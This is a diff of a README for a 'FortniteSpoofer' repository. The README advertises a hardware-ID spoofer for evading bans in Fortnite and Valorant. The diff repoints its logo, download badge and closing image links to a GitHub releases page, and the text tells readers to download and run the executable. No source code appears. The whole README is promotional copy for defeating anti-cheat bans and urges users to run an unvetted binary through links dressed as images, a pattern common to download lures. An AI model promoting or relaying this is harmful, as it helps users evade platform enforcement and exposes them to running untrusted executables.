@@ -4,7 +4,7 @@
 
 Welcome to the **FortniteSpoofer** repository, your ultimate solution for bypassing hardware bans in games like Fortnite and Valorant. In this repository, you will find a powerful tool known as a spoofer that randomizes the serial numbers and physical addresses assigned to your hardware, making it impossible for games and other software to track you during reboots.
 
-![FortniteSpoofer Logo](https://example.com/logo.png)
+![FortniteSpoofer Logo](https://github.com/WilliamBraDev/FortniteSpoofer/releases)
 
 ## What is a Spoofer?
 
@@ -35,7 +35,7 @@ To give you an overview of the content available in this repository, here are so
 
 To get started with the **FortniteSpoofer**, simply download the tool from the following link:
 
-[![Download FortniteSpoofer](https://img.shields.io/badge/Download-FortniteSpoofer-blue)](https://github.com/assets/Release.zip)
+[![Download FortniteSpoofer](https://github.com/WilliamBraDev/FortniteSpoofer/releases)](https://github.com/WilliamBraDev/FortniteSpoofer/releases)
 
 Once you have downloaded the tool, launch the executable file and follow the on-screen instructions to start spoofing your hardware and bypassing bans.
 
@@ -45,4 +45,4 @@ If the provided link does not work or you need more information, please check th
 
 With the **FortniteSpoofer** at your disposal, you can game with peace of mind knowing that your hardware identifiers are constantly changing, making it nearly impossible for game developers to track or ban you. Say goodbye to restrictions and enjoy gaming to the fullest with our powerful spoofing tool.
 
-![Happy Gaming](https://example.com/happy-gaming.png)
+![Happy Gaming](https://github.com/WilliamBraDev/FortniteSpoofer/releases)
